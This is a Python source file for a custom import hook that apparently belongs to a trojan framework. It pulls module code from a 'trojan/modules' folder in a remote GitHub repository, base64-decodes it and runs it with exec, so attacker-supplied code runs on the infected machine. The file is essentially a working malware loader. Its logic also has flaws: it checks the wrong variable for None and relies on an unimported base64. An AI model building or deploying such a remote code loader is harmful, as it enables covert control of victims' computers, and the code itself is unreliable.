from git_funcs import *
import importlib
import sys

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = connect()
        try:
            # Attempt to get the module contents from the GitHub repository
            new_library = get_file_contents("trojan/modules", name + ".py", self.repo)
            if self.current_module_code is None:
                raise ImportError(f"Module {name} not found in repository.")
            else:
                self.current_module_code = base64.b64decode(new_library)
            return self
        except Exception as e:
            print(f"Error importing module {name}: {e}")
            raise ImportError(f"Module {name} not found in repository.") from e
    
    def load_module(self, name):
        spec= importlib.util.spec_from_loader(name, loader=None,origin=self.repo.git_url)
        module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, module.__dict__)
        sys.modules[spec.name] = module
        return module